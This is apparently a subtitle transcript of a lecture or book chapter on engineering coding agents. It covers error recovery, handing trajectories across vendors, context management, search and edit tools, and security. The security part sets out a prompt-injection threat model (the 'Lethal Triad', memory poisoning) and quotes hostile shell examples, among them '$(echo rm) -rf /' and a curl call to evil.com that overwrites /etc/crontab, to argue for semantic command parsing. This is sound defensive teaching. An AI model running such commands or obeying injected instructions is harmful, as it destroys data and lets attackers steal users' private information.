Surface to the user.

234
00:34:59.429 --> 00:35:06.829
Only after all automatic means are exhausted is the error presented—together with the recovery actions already attempted.

235
00:35:06.829 --> 00:35:13.579
Tool-layer errors take a different path: do not terminate the session; turn the error into the model's input.

236
00:35:13.579 --> 00:35:29.829
A hallucinated call receives a structured "no such tool" error result; a validation failure receives an error annotated with hints about the input contract; malformed arguments (a string emitted where an object was expected) are programmatically repaired before execution.

237
00:35:29.829 --> 00:35:45.579
These errors enter the context as ordinary tool results, and the model corrects itself on the next turn—an application of the earlier principle that "the more structured the feedback, the better": the more specific the error fed back, the higher the model's self-correction rate.

238
00:35:45.579 --> 00:35:53.192
The core principle of this section is: the unit of error handling is not the single request, but the entire recovery loop.

239
00:35:53.192 --> 00:36:11.329
Until recovery is confirmed impossible, intermediate errors should not be exposed to consumers—whether the user or downstream systems subscribed to events: withhold error messages during recovery; if recovery succeeds, consumers never notice; only when everything fails are the withheld errors released.

240
00:36:11.329 --> 00:36:20.204
This is the engineering realization of Chapter 1's correction principle—"do not expose intermediate states until recovery is confirmed impossible.

241
00:36:20.204 --> 00:36:24.717
Handover: passing an unfinished trajectory to another model.

242
00:36:24.717 --> 00:36:30.217
When the primary model stays unavailable, another vendor has to finish the trajectory.

243
00:36:30.217 --> 00:36:37.154
The real obstacle is not that the endpoint differs, but that part of the trajectory belongs to the original vendor alone.

244
00:36:37.154 --> 00:36:46.767
Tool calls and tool results are structured differently across vendors yet carry the same meaning, so re-rendering them is enough; the model's reasoning is the hard part.

245
00:36:46.767 --> 00:36:55.592
Reasoning usually consists of two things: readable text, and a credential the vendor attaches to it to prove the reasoning really came from itself.

246
00:36:55.592 --> 00:37:04.417
The text is still legible to another model, the credential is worthless there—a cross-vendor handover can carry the text, but not the credential.

247
00:37:04.417 --> 00:37:08.254
Vendors do not agree on what they require of a credential.

248
00:37:08.254 --> 00:37:14.029
The permissive end validates nothing; the strict end rejects any credential it did not issue.

249
00:37:14.029 --> 00:37:20.492
Nor is the credential necessarily attached to the reasoning—it may be attached to the tool call instead.

250
00:37:20.492 --> 00:37:28.179
So the seemingly safe policy "just delete all the reasoning and you are fine" is precisely what fails at some vendors.

251
00:37:28.179 --> 00:37:42.304
A handover has to be designed for the strictest end, with a fallback for the cases it cannot satisfy: rewrite the historical tool calls as prose, which stops the model from treating them as tools it actually invoked, but at least lets it carry on.

252
00:37:42.460 --> 00:37:50.547
This yields a design principle: a trajectory should not be stored in any single vendor's wire format, but kept in a neutral one.

253
00:37:50.497 --> 00:38:02.585
Each reasoning segment is split into portable text and a non-portable credential; a tool call records only its name and arguments, and identifiers are regenerated for the target vendor when the request is rendered.

254
00:38:02.585 --> 00:38:12.385
On a switch the credential is always discarded and the text is carried across as ordinary content, rather than being pushed back into wherever the target vendor keeps reasoning.

255
00:38:12.385 --> 00:38:22.122
The reasoning summary a vendor returns is exactly the portable copy meant for this situation—keep it, and there is no need to call a model again to compress anything.

256
00:38:22.122 --> 00:38:35.672
The value of a neutral trajectory is not limited to failover either: the evaluation replays of Chapter 7, the training-sample construction of Chapter 8 and the experience extraction of Chapter 9 all rely on the same artifact.

257
00:38:35.672 --> 00:38:42.197
Experiment 5-1 advanced difficulty, three stars: : Cross-Vendor Trajectory Handover

258
00:38:42.197 --> 00:38:55.485
Experiment Goal: Verify whether a neutral trajectory format lets a half-finished Agent trajectory be finished by a different vendor's model, and quantify what "verbatim pass-through" and "strip everything" each cost.

259
00:38:55.485 --> 00:39:09.247
Technical Approach: Use a task that needs several rounds of tool calls; midway, inject consecutive rate-limit and overload responses for the current vendor, and after the circuit breaker trips, switch to another vendor and continue.

260
00:39:09.247 --> 00:39:18.785
Store the trajectory in a neutral format where reasoning is split into portable text and a non-portable credential and a tool call records only its name and arguments.

261
00:39:18.785 --> 00:39:42.135
Compare three treatments: pass-through moves the original vendor's messages verbatim into the new vendor's structure; stripping deletes all reasoning and credentials; neutral discards the credential and carries the text, or the reasoning summary the vendor returned, as ordinary content, regenerating identifiers for the target vendor and rewriting historical calls as prose when the receiving side insists on a credential.

262
00:39:42.135 --> 00:39:47.247
Pick three vendors whose wire formats differ and switch between each pair.

263
00:39:47.247 --> 00:39:57.472
Acceptance Criteria: Retain the raw response of the first request after every switch; a pass-through failure must be the vendor's real error, never a simulated one.

264
00:39:57.472 --> 00:40:06.660
Require the neutral treatment to produce no API error on any vendor pair, and record faithfully which pairs the other two fail on and with what error.

265
00:40:06.660 --> 00:40:18.860
Compare the three on task completion, on how often the same tool is called again after the switch (fingerprinted by tool name plus arguments), and on the extra rounds and tokens needed to finish after the switch.

266
00:40:18.860 --> 00:40:24.872
If the neutral treatment does not beat stripping on redundant calls, record that just as faithfully.

267
00:40:24.872 --> 00:40:32.435
Experiment 5-2 intermediate difficulty, two stars: : Continuing After the Output Is Cut Off Halfway

268
00:40:32.435 --> 00:40:42.635
Experiment Goal: Compare "resend the whole turn" against "continue from the half-written output as a prefix" in cost, correctness and side effects.

269
00:40:42.635 --> 00:40:51.360
Technical Approach: Cut the connection at three points in a streaming response—mid-reasoning, mid-prose, and mid tool-call argument.

270
00:40:51.360 --> 00:41:12.860
Three recovery routes: discard the fragment and resend the whole turn; append the fragment as a trailing assistant message and ask the model to continue it (some vendors support this natively, some require the message to be explicitly marked as one awaiting continuation, and those without such an interface fall back to the next route); append a meta-instruction saying to continue from the break.

271
00:41:12.860 --> 00:41:22.772
A half-written tool call cannot be sent back in its native structure, so it must be turned into text for the model to complete, then re-parsed and validated after splicing.

272
00:41:22.772 --> 00:41:31.347
If a tool was already executed eagerly from the fragment, deduplicate by call fingerprint before continuing to avoid repeating the side effect.

273
00:41:31.516 --> 00:41:54.691
Acceptance Criteria: Repeat each of the three break points several times and report, for each route, the recovery rate, the output tokens saved relative to a full resend, the validity and the semantic correctness of the completed arguments (a splice easily adds stray whitespace or duplicated characters, and valid is not the same as correct), and the number of repeated side effects.

274
00:41:54.641 --> 00:42:01.328
Also record which break points cannot be reproduced at which vendors, and whether the fallback route works.

275
00:42:01.328 --> 00:42:05.178
Termination: every recovery path needs a ceiling.

276
00:42:05.178 --> 00:42:23.878
Recovery mechanisms themselves can fail, so every recovery path must have an explicit retry ceiling: context compaction gives up after several consecutive failures; the permission classifier falls back to asking a human after repeated failures; output continuation is attempted at most a fixed number of times.

277
00:42:23.878 --> 00:42:26.328
Where do the thresholds come from?

278
00:42:26.328 --> 00:42:29.166
Production data, not guesswork.

279
00:42:29.166 --> 00:42:52.516
Take Claude Code's compaction circuit breaker: the "3 consecutive failures" threshold comes from real session statistics—one session once failed over three thousand times in a row on this very recovery path, and such futile retries alone wasted about 250,000 API calls per day worldwide; more than a thousand sessions saw streaks of 50+ consecutive failures.

280
00:42:52.516 --> 00:43:01.791
Three is the empirical inflection point between "the vast majority of failures recover before this" and "further retries are essentially hopeless.

281
00:43:01.791 --> 00:43:11.428
More insidious than a single-point breaker is the death spiral: logic triggered on the error path itself calls the LLM, fails again, and cascades.

282
00:43:11.428 --> 00:43:29.566
One real cascade: the Agent stops on a context-overflow error, which fires a stop hook (cleanup logic that runs automatically when the Agent ends) that "commits code on exit," the hook calls the LLM to write a commit message, context overflows again, and the hook fires once more.

283
00:43:29.566 --> 00:43:44.266
Defense comes in two parts: disable all model-invoking side effects on the error path (better to lose an auxiliary feature once, such as automatic memory extraction), and use a recursion-depth counter to detect and break any residual cascade.

284
00:43:44.266 --> 00:43:58.366
Finally, above all automatic mechanisms sit global termination and escalation conditions: a maximum number of turns, a session budget cap, and escalation to human intervention when consecutive failures exceed their threshold.

285
00:43:58.366 --> 00:44:01.553
Implementation Tips for Coding Agents.

286
00:44:01.553 --> 00:44:04.803
The workflow described above is the ideal.

287
00:44:04.803 --> 00:44:15.141
Making it run in practice takes a handful of concrete implementation techniques—ways to raise response speed and cut context consumption without degrading the quality of thought.

288
00:44:15.141 --> 00:44:21.103
They are the general Agent techniques of Chapters 2 and 4, applied to the programming domain.

289
00:44:21.103 --> 00:44:26.153
Parallel Tool Calls, Streaming Execution, and Cascading Abort.

290
00:44:26.153 --> 00:44:34.916
Traditional Agent implementations often work serially: generate a tool call, execute it, get the result, then decide the next step.

291
00:44:34.916 --> 00:44:38.441
This strict queuing wastes a great deal of time.

292
00:44:38.596 --> 00:44:56.896
Modern Coding Agents should fully leverage streaming responses: Chapter 2 introduced this mechanism when discussing model output order—once the parameters of the first tool call are fully generated and pass validation, execution can begin immediately, without waiting for the model to generate subsequent tool calls.

293
00:44:56.846 --> 00:45:13.408
For example, if the model needs to output three tool calls in one inference—search code, check configuration files, and read logs—the first call can start executing as soon as its parameters are complete and validated, overlapping with the generation of the other two.

294
00:45:13.408 --> 00:45:18.208
Independent calls can also be executed in parallel rather than queued.

295
00:45:18.208 --> 00:45:25.421
This overlapping execution significantly reduces end-to-end latency, making the Agent's responses more agile.

296
00:45:25.421 --> 00:45:29.333
The flip side of parallel execution is fault handling.

297
00:45:29.333 --> 00:45:36.233
Each tool definition should declare whether it supports concurrent execution (default is no, fail-safe).

298
00:45:36.233 --> 00:45:53.108
When a call fails, a cascading abort mechanism terminates other calls started in the same batch that depend on its result, but does not affect independent calls or the parent operation—this is a concrete implementation of the "fault boundary control" principle from the Harness engineering section.

299
00:45:53.108 --> 00:45:55.958
Fine-Grained Context Management.

300
00:45:55.958 --> 00:46:03.471
The fundamental challenge for Coding Agents is that codebases are usually large, but the model's context window is limited.

301
00:46:03.471 --> 00:46:12.308
Even if advanced models claim to support millions of tokens, stuffing the entire codebase into the context is neither economical nor necessary.

302
00:46:12.308 --> 00:46:16.996
Intelligent context management needs to operate at multiple levels.

303
00:46:16.996 --> 00:46:22.171
At the file reading level, the Agent should not always read the entire file.

304
00:46:22.171 --> 00:46:33.758
For large files, the tool should support reading specific line ranges—for example, only reading lines 100 to 150, rather than loading a file with thousands of lines.

305
00:46:33.758 --> 00:46:41.858
More importantly, when returning content, line numbers should be attached—each line of code is prefixed with its actual line number.

306
00:46:41.858 --> 00:46:55.183
This seemingly simple design brings great value: the model can precisely reference "line 42 of src/main.py," reducing ambiguity and making subsequent edit operations more reliable.

307
00:46:55.183 --> 00:47:00.696
At the command execution level, handling terminal output also requires care.

308
00:47:00.696 --> 00:47:05.033
Compilation or testing can produce thousands of lines of output.

309
00:47:05.033 --> 00:47:10.246
If all of it is injected into the context, the budget is quickly exhausted.

310
00:47:10.246 --> 00:47:31.746
The long output truncation and persistence mechanism introduced in Chapter 4 is widely applied here: retain the first few lines of output (usually containing error context) and the last few lines (usually containing error summaries), replace the middle with a one-line placeholder, and note that the complete output has been saved to a temporary file for on-demand viewing.

311
00:47:31.746 --> 00:47:35.071
Dynamic Injection of Environment Information.

312
00:47:35.071 --> 00:47:41.408
This is a practical application of the Agent status bar technique from Chapter 2 to Coding Agents.

313
00:47:41.408 --> 00:47:47.633
Unlike general Agents, Coding Agents are highly dependent on the state of the execution environment.

314
00:47:47.633 --> 00:47:55.971
Before each inference, the following key environment information should be injected at the end of the context in the form of an Agent status bar:

315
00:47:55.971 --> 00:48:00.496
Current working directory: ensures path references are correct

316
00:48:00.496 --> 00:48:05.433
Git branch: knows whether working on the main branch or a feature branch

317
00:48:05.433 --> 00:48:09.658
Recent commit history: understands the project's evolution

318
00:48:09.658 --> 00:48:15.521
Overview of unstaged and staged changes: knows what modifications have been made

319
00:48:15.521 --> 00:48:27.046
This information should not be hardcoded into static system prompts—that would destroy KV Cache efficiency—but should be dynamically generated and injected as an appended Agent status bar.

320
00:48:27.046 --> 00:48:37.033
In this way, the Agent gains "environmental awareness," with each decision based on an accurate understanding of the current state, rather than outdated assumptions.

321
00:48:37.033 --> 00:48:40.896
State Persistence in the Command Execution Environment.

322
00:48:41.044 --> 00:48:53.019
When interacting with code, many operations depend on environment state: changing directories, activating virtual environments, setting environment variables, starting background services.

323
00:48:52.969 --> 00:49:07.056
If each command is executed in a fresh shell, all this state is lost—the Agent just used cd to navigate to the project directory, but the next command starts again in the shell's default directory, forcing it to repeat the same setup.

324
00:49:07.056 --> 00:49:17.444
Worse, the effects of some operations (like activating a Python virtual environment) are only valid within the current shell session and cannot be passed across sessions.

325
00:49:17.444 --> 00:49:25.769
Therefore, a persistent terminal session should be maintained, created when the Agent starts and kept active throughout the entire interaction.

326
00:49:25.769 --> 00:49:33.656
Each command is executed in this shared terminal, preserving the working directory, environment variables, and session state.

327
00:49:33.656 --> 00:49:40.794
This design is more aligned with the work habits of human developers—we usually work in a long-running terminal window.

328
00:49:40.794 --> 00:49:50.381
Of course, the Agent should also retain the ability to start isolated terminals to support parallel tasks, but the persistent session should be the default mode.

329
00:49:50.381 --> 00:49:53.481
Instant Syntax Feedback Mechanism.

330
00:49:53.481 --> 00:49:58.381
This once again demonstrates the value of the Agent status bar technique.

331
00:49:58.381 --> 00:50:05.844
After the Agent modifies code, it should not wait for the user to explicitly request testing before checking syntax.

332
00:50:05.844 --> 00:50:18.019
A more efficient approach is for the tool layer to run the corresponding linter or syntax checker automatically as soon as the file write operation is complete and present the results as part of the tool's return value to the Agent.

333
00:50:18.019 --> 00:50:29.081
If a syntax error is detected, the Agent sees the detailed error information immediately in the next inference round—much as an IDE immediately flags an unmatched parenthesis.

334
00:50:29.081 --> 00:50:40.831
This instant feedback mechanism significantly reduces the cost of error fixing, because the Agent can correct the error at the moment it is introduced, without waiting until running tests to discover the problem.

335
00:50:40.831 --> 00:50:54.606
These five implementation techniques—parallelism and streaming, context management, environmental awareness, state persistence, and instant feedback—together form the technical foundation of an efficient Coding Agent.

336
00:50:54.606 --> 00:51:06.344
They are not isolated optimization points, but mutually reinforcing design decisions, all pointing toward a single goal: enabling the Agent to work as smoothly as an experienced developer.

337
00:51:06.344 --> 00:51:09.194
Search Tools in Coding Agents.

338
00:51:09.194 --> 00:51:14.906
Locating relevant code in a large codebase is the starting point for a Coding Agent's work.

339
00:51:14.906 --> 00:51:24.819
Figure 5-3 compares several complementary search tools, illustrating how a mature Coding Agent should choose retrieval methods based on the nature of the task.

340
00:51:24.819 --> 00:51:30.831
As illustrated in Figure 5-3: Comparison of Coding Agent Search Tools.

341
00:51:30.831 --> 00:51:39.731
Regex Content Matching (grep/ripgrep): The most traditional search method, scanning file contents line by line for pattern matches.

342
00:51:39.731 --> 00:51:49.344
When the Agent knows the exact text to find (function names, variable names, error messages), it can locate every occurrence quickly and accurately.

343
00:51:49.344 --> 00:51:57.656
The expressive power of regular expressions (a syntax for describing text patterns with special symbols, e.g., def handle.

344
00:51:57.656 --> 00:52:07.431
matches all function definitions starting with handle) captures complex patterns—not just literal text, but code that conforms to a particular structure.

345
00:52:07.431 --> 00:52:18.606
In practice, file type filtering (search only Python files) and path pattern filtering (exclude test directories) should also be supported to reduce noise.

346
00:52:18.606 --> 00:52:32.944
The fundamental limitation: it finds only textual matches and understands no semantics—a search for "user authentication" will never surface a function that handles login logic but happens not to contain the word "authentication.

347
00:52:33.100 --> 00:52:41.562
Filename Pattern Matching (glob): Ignores file content, only searches the file system's path structure for files matching a pattern.

348
00:52:41.512 --> 00:52:56.100
For example, /.test.ts recursively finds all TypeScript test files, src/components//Button.tsx searches for Button.tsx at any depth under components.

349
00:52:56.100 --> 00:53:09.787
It is much faster than content search (no need to open and read files) and is the Agent's first step in exploring the project structure—quickly establishing the project's organizational framework by scanning the entire file system.

350
00:53:09.787 --> 00:53:18.350
Semantic Code Search: Unlike the first two exact matching methods, it attempts to understand the "meaning" of the query and the code.

351
00:53:18.350 --> 00:53:21.312
It needs to solve two key problems:

352
00:53:21.312 --> 00:53:33.700
Structure-Aware Chunking: Code has strict syntactic structure and should be split by complete semantic units like functions, classes, and methods, rather than blindly cutting by a fixed number of characters.

353
00:53:33.700 --> 00:53:54.262
Hybrid Retrieval (Chapter 3 details this technology stack): Vector embeddings (dense embeddings) excel at finding semantically similar code with different wording (e.g., searching for "verify user identity" can find a function named check_credentials), while keyword matching excels at precisely matching function and variable names.

354
00:53:54.262 --> 00:54:05.625
The two run in parallel, and the results are merged and sorted by a reranker (a cross-encoder that performs fine-grained relevance ranking on candidate results), providing complementary coverage.

355
00:54:05.625 --> 00:54:17.950
Semantic search is particularly suitable for exploratory tasks, such as finding code related to "interacting with the database" or "handling user input validation" in an unfamiliar codebase.

356
00:54:17.950 --> 00:54:24.900
However, there is a clear debate in the industry about whether it is worth building embedding indices for semantic search.

357
00:54:24.900 --> 00:54:40.675
Terminal-based Agents like Claude Code deliberately do not build embedding indices, relying purely on agentic grep + glob for on-the-fly retrieval—this avoids maintaining indices that become stale as the code evolves, eliminates the entire indexing infrastructure.

358
00:54:40.675 --> 00:54:55.900
IDE-based tools like Cursor initially took the opposite approach: they are willing to pay the cost of building indices for cross-file semantic recall, using embedding indices to quickly find semantically related but differently worded snippets in large codebases.

359
00:54:55.900 --> 00:55:01.837
Today, IDEs like Cursor have also switched to on-the-fly grep + glob retrieval.

360
00:55:01.837 --> 00:55:25.050
Symbol-Level Definition and Reference Lookup: This method uses IDE-like "go to definition" and "find all references" capabilities to distinguish symbol definitions from references—for example, it identifies authenticate on line 42 as a function definition and the occurrence on line 189 as a call, whereas text search can only find all lines containing that string.

361
00:55:25.050 --> 00:55:29.200
Mainstream coding agents do not currently use this approach.

362
00:55:29.200 --> 00:55:50.262
These four search methods form a complementary toolbox, often used in combination in practice: first use semantic search to find relevant modules, then use regex matching to precisely locate specific lines of code, and finally use symbol search to trace the call chain—a progressive strategy "from coarse to fine, from semantics to syntax.

363
00:55:50.262 --> 00:55:53.550
File Editing Tools in Coding Agents.

364
00:55:53.550 --> 00:56:03.900
The difficulty of file editing lies not in the operation itself, but in how to efficiently and reliably tell the system "what to change and how to change it" using an LLM.

365
00:56:03.900 --> 00:56:13.462
Figure 5-4 compares five file editing schemes, illustrating the fundamental tension between human language expression and machine-precise execution.

366
00:56:13.462 --> 00:56:19.487
As illustrated in Figure 5-4: Comparison of Five File Editing Schemes.

367
00:56:19.636 --> 00:56:43.873
Diff Description + Apply Model: The model does not directly specify how to edit the file; instead, it generates a change description—which can be a diff text similar to git diff (the format output by the git diff command, showing "which lines were deleted and which were added"), or a code skeleton with omission markers (using comments like "remain unchanged here" to skip unmodified parts).

368
00:56:43.823 --> 00:56:55.698
This description is then handed to a specialized "Apply Model"—usually another, smaller, faster LLM—responsible for merging it with the original file to produce the complete new file.

369
00:56:55.698 --> 00:57:04.436
This separation of concerns allows the main model to focus on high-level code logic and the apply model to focus on low-level text operations.

370
00:57:04.436 --> 00:57:20.961
The fragility of a naive implementation lies in the merge step: when there are minor discrepancies between the change description and the actual file code, it needs to determine if they refer to the same location; when there are multiple similar code snippets, it might merge into the wrong place.

371
00:57:20.961 --> 00:57:45.848
Cursor is a representative of the continuous evolution of this approach: the main model outputs a code skeleton with omission markers, a specially trained fast-apply small model rewrites the complete file, and speculative decoding (using the original file content as a draft for parallel verification) pushes the merge speed to thousands of tokens per second—engineering investment has bought reliability and speed for this approach.

372
00:57:45.848 --> 00:57:50.298
Old String → New String: The approach adopted by Claude Code.

373
00:57:50.298 --> 00:58:00.798
The model provides an old string (the original text to be replaced) and a new string (the replacement text), and the framework performs a simple string find-and-replace.

374
00:58:00.798 --> 00:58:10.411
The advantage is predictability and transparency—if the old string exists and is unique in the file, it succeeds; otherwise, it fails.

375
00:58:10.411 --> 00:58:12.698
There is no ambiguity.

376
00:58:12.698 --> 00:58:22.073
The cost is that deleting large blocks of code requires outputting all the original content in full; a single character deviation causes the match to fail.

377
00:58:22.073 --> 00:58:28.286
When the same code appears multiple times, a longer context must be provided to disambiguate.

378
00:58:28.286 --> 00:58:36.398
Line Number Targeting (Old Line Numbers → New String): The model specifies "delete lines X to Y, insert new content.

379
00:58:36.398 --> 00:58:42.923
If the file-reading tool includes line numbers, the model can identify the exact range to replace.

380
00:58:42.923 --> 00:58:47.773
Deleting a large block requires only its starting and ending line numbers.

381
00:58:47.773 --> 00:58:51.723
However, each edit shifts the line numbers that follow it.

382
00:58:51.723 --> 00:59:00.298
When the model proposes several edits at once, all edits should refer to the original line numbers, as in a diff, to avoid confusion.

383
00:59:00.460 --> 00:59:09.022
Vim-like Edit Commands: Borrowing from the Vim editor's command system, supporting rich operations like copy, cut, and paste.

384
00:59:08.972 --> 00:59:14.422
Very efficient for restructuring code (moving a function from one place to another).

385
00:59:14.422 --> 00:59:23.210
But the command syntax carries a real learning burden: the strongest models handle it well, while smaller models make noticeably more mistakes.

386
00:59:23.210 --> 00:59:37.197
This approach is also unfriendly to a model that emits several edit commands from a single round of thinking, because after each Vim edit the file content and the line numbers change, and the model can hardly compute the post-edit line numbers in advance.

387
00:59:37.197 --> 00:59:48.947
A deeper thought: editors like Vim were designed for humans, and a human needs to keep seeing the current state and then plan one simple next operation (write a line of code, delete a few lines).

388
00:59:48.947 --> 00:59:58.747
But today a model works by thinking for a fairly long stretch and then performing a batch of rather complex operations (writing several hundred lines of code at once).

389
00:59:58.747 --> 01:00:07.322
String Start + End Matching (Old String Start + End → New String): This can be seen as an improvement over the old string replacement scheme.

390
01:00:07.322 --> 01:00:17.135
The model does not need to output the complete old string; it only needs to provide the first few lines and the last few lines of the content to be deleted, omitting the middle part.

391
01:00:17.135 --> 01:00:24.647
The framework locates the replacement area from this start-and-end pair, provided that the combination is unique within the file.

392
01:00:24.647 --> 01:00:38.360
This scheme combines the reliability of text replacement with the efficiency of the line number approach—when deleting large blocks of code, there is no need to output hundreds of lines of original code, only the boundaries need to be shown.

393
01:00:38.360 --> 01:00:47.560
At the same time, because it is still based on content matching rather than abstract line numbers, the risk of the model making errors is relatively low.

394
01:00:47.560 --> 01:00:50.222
Security for Coding Agents.

395
01:00:50.222 --> 01:01:20.397
This section organizes the Coding Agent's defenses into a coherent framework: we first outline the threat model—which risks are most lethal; then isolation as the safety net—network egress, file system, and resource limits in the sandbox; then execution-time defense—semantic parsing of commands, and speculative execution that makes security checks "invisible"; and finally trust and loyalty—whom the Agent serves under multi-party delegation, and how to move the trust boundary down to the data

396
01:01:20.397 --> 01:01:24.247
layer when AI-written code itself cannot be trusted.

397
01:01:24.247 --> 01:01:33.560
The threat model, loyalty, and trust-boundary discussions apply to all Agents; sandboxing and command parsing are specific to Coding Agents.

398
01:01:33.560 --> 01:01:39.260
This "sovereign Agent" paradigm also introduces severe security challenges.

399
01:01:39.260 --> 01:01:50.835
A Coding Agent has permissions to read and write files, execute commands, and access networks, meaning that once injected with malicious instructions, it could cause irreversible damage.

400
01:01:50.835 --> 01:02:03.272
Developer and independent researcher Simon Willison summarized this risk with his famous "Lethal Triad"—when all three elements are present, they form a complete attack loop, putting the system at high risk:

401
01:02:03.272 --> 01:02:08.922
Access to Private Data — The Agent can read user files and password managers.

402
01:02:08.922 --> 01:02:15.697
Exposure to Untrusted Content — Processed emails and web pages may contain malicious payloads.

403
01:02:15.697 --> 01:02:21.222
Ability to Communicate Externally — It can send emails and execute commands.

404
01:02:21.222 --> 01:02:31.885
This closes the attack loop: malicious instructions hidden in untrusted content enter the Agent, drive it to read private data, and then exfiltrate it through external channels.

405
01:02:31.885 --> 01:02:38.435
Note that the presence of all three elements is dangerous enough on its own, without any additional conditions.

406
01:02:38.435 --> 01:02:43.435
Building on this, the author adds a fourth dimension—Persistent Memory.

407
01:02:43.435 --> 01:03:02.785
This is not a parallel fourth necessary condition, but an amplifier for attacks: an attacker can write seemingly harmless biases or malicious instructions into the Agent's long-term memory, where they lie dormant across sessions and trigger at an opportune moment — turning a one-off attack into a threat that lies in wait and compounds over time.

408
01:03:02.956 --> 01:03:13.081
These four points can be summarized as four types of boundaries: data boundary, input trust boundary, output impact boundary, and cross-session boundary.

409
01:03:13.031 --> 01:03:22.293
A full-permission local Agent like OpenClaw spans all four risk dimensions, making security protection a core challenge that such Agents must confront.

410
01:03:22.293 --> 01:03:41.743
This also explains why closed-source commercial Agents (like Claude Cowork (Anthropic's general-purpose Agent for knowledge work, reusing Claude Code's agentic architecture, capable of reading and writing local files and completing multi-step tasks across multiple office applications)) have chosen conservative permission strategies.

411
01:03:41.743 --> 01:03:46.368
Against prompt injection, input filtering alone barely helps.

412
01:03:46.368 --> 01:03:54.418
The goal is not to recognize every attack, but to ensure that an injected Agent never gets the chance to carry a dangerous action through.

413
01:03:54.418 --> 01:03:59.318
This is exactly where the three-layer guardrails from Chapter 1 come into play.

414
01:03:59.318 --> 01:04:04.243
Compared with other Agents, Coding Agents need to pay special attention to:

415
01:04:04.243 --> 01:04:16.631
Command Semantic Parsing — The combinatorial explosion of Shell commands makes keyword blacklists useless; the real effect of a command must be understood at the semantic level (expanded later in this section)

416
01:04:16.631 --> 01:04:29.243
Sandbox Isolation and Network Egress Control — Code execution is an attack surface unique to Coding Agents; the engineering choices for isolation levels and egress strategies are covered later in this section;

417
01:04:29.243 --> 01:04:45.768
Cross-Session Defense for Persistent Memory — This chapter extends the Lethal Triad analysis to persistent memory: content written to long-term memory must undergo the same trust review as external input so that malicious instructions cannot lie dormant in MEMORY.md and take effect later.

418
01:04:45.768 --> 01:04:55.481
These three protections fall into the verification, execution, and data layers respectively, complementing the defense system from the previous two chapters.

419
01:04:55.481 --> 01:05:01.693
These strategies cannot completely eliminate risk, but they can reduce the Agent's attack surface.

420
01:05:01.693 --> 01:05:07.543
Isolation as the Safety Net: Engineering Choices for the Code Execution Sandbox.

421
01:05:07.543 --> 01:05:09.943
Network egress control.

422
01:05:09.943 --> 01:05:24.631
This is the item most easily overlooked and yet the most critical: no network by default, with a whitelist proxy admitting a limited set of destinations on demand (package sources, documentation sites, APIs the task explicitly needs).

423
01:05:24.631 --> 01:05:34.193
Look back at item 3 of the Lethal Triad—"the ability to communicate externally": network egress control is precisely its execution-layer defense.

424
01:05:34.193 --> 01:05:42.806
Even if a prompt injection succeeds and malicious code reads sensitive data inside the sandbox, with no egress the data cannot get out.

425
01:05:42.806 --> 01:05:45.793
Scope of file-system isolation.

426
01:05:45.793 --> 01:06:08.568
Mount the source directory read-only (the Agent modifies code through editing tools, and the generated patch is written to disk after review, or a copy is mounted into a writable workspace); a separate writable workspace directory holds the artifacts and intermediate files; credential files (~/.ssh, keys, tokens) are not mounted into the sandbox at all.

427
01:06:08.568 --> 01:06:11.343
Resource quotas and timeouts.

428
01:06:11.343 --> 01:06:24.143
CPU, memory, and disk quotas plus a timeout defend against infinite loops, fork bombs (processes that drag the system down by replicating themselves wildly), and unbounded disk writes.

429
01:06:24.143 --> 01:06:41.293
One practical detail: a timeout or quota violation should return a structured error to the Agent ("execution was terminated after 120 seconds; the last output follows...") rather than silently killing the process, so that the Agent has a chance to correct its strategy on the next turn.

430
01:06:41.293 --> 01:06:46.368
Safety: Semantic Parsing over Keyword Blacklists.*

431
01:06:46.540 --> 01:06:53.177
Chapter 1 argued that the verification layer should rely on semantic understanding rather than pattern matching.

432
01:06:53.127 --> 01:06:58.552
Shell command security validation is the most challenging application of this principle.

433
01:06:58.552 --> 01:07:16.265
Simple keyword blacklists cannot cope with the combinatorial explosion of Shell—commands can bypass any static rules through pipes, subshells, variable expansion, etc. (e.g., if rm is blocked, an attacker can use $(echo rm) -rf / to bypass).

434
01:07:16.265 --> 01:07:32.540
Production-grade Harnesses employ semantic parsing: identifying each command's argument types and parsing rules, including which flags consume following arguments, and recognizing attack patterns such as a seemingly harmless flag that hides a dangerous payload in its next argument.

435
01:07:32.540 --> 01:07:55.215
For example, find / -name '.log' -exec rm {} \; embeds an rm delete operation through legitimate find command arguments; another example is curl -o /etc/crontab http://evil.com/payload, which appears to download a file but actually overwrites system scheduled tasks.

436
01:07:55.215 --> 01:08:02.702
Semantic parsing can identify these nested dangerous operations, while simple command blacklists cannot capture them.

437
01:08:02.702 --> 01:08:09.977
This security mechanism based on understanding rather than matching is a high-level implementation of the "constraint" function.

438
01:08:09.977 --> 01:08:14.815
Whom Does the Agent Serve: Loyalty Under Multi-Party Delegation.

439
01:08:14.815 --> 01:08:25.752
The security mechanisms above prevent "commands from being executed maliciously"; there is a subtler security issue—principal loyalty: whose side is the Agent actually on.

440
01:08:25.752 --> 01:08:40.852
Models are trained with a naive default principle—"whoever is talking to me, I will try my best to help them"—but real-world Agents often operate under multi-party delegation: acting on behalf of a principal while dealing with third parties whose interests conflict.

441
01:08:40.852 --> 01:08:47.940
An Agent negotiating a price on your behalf faces not a "user in need of help" but a negotiating opponent.

442
01:08:47.940 --> 01:08:56.077
Here, "help whoever speaks" is a dangerous default—the opposing party can begin influencing your Agent simply by engaging it.

443
01:08:56.077 --> 01:09:02.690
Putting frontier models into this situation reveals a clear loyalty spectrum, with both ends failing

444
01:09:02.690 --> 01:09:20.240
This is particularly relevant to Coding Agents: untrusted content read from a repository, output returned by a tool, instructions sent by a third-party MCP server—all are "opponents" trying to turn the Agent—prompt injection is essentially an attempt at turning (Chapters 2 and 4).

445
01:09:20.240 --> 01:09:35.090
The Harness must therefore explicitly nail down whom the Agent is loyal to: instructions from the principal carry the highest priority, while everything from external parties is downgraded by default to "data that may be consulted but carries no force of instruction.

446
01:09:35.090 --> 01:09:57.202
In the system prompt, an effective loyalty code of conduct is: protect the principal's private information, including the fact that it exists; when refusing, do not enumerate protected details, because doing so may itself leak them; private bottom lines are not public positions; only execute the principal's clear and specific instructions; withstand repeated pressure.

447
01:09:57.202 --> 01:10:06.690
Essentially, this is using the Harness to give the model a stance it lacks by default: absolute loyalty to the principal, and caution toward external parties.

448
01:10:06.690 --> 01:10:10.390
Code: The Meta-Capability of a General Agent.

449
01:10:10.390 --> 01:10:18.202
The previous section showed how to build a reliable Coding Agent—from architecture to tool implementation to harness engineering.

450
01:10:18.202 --> 01:10:23.140
But the value of code generation extends far beyond writing programs.

451
01:10:23.308 --> 01:10:25.795
What is a "meta-capability"?

452
01:10:25.745 --> 01:10:35.070
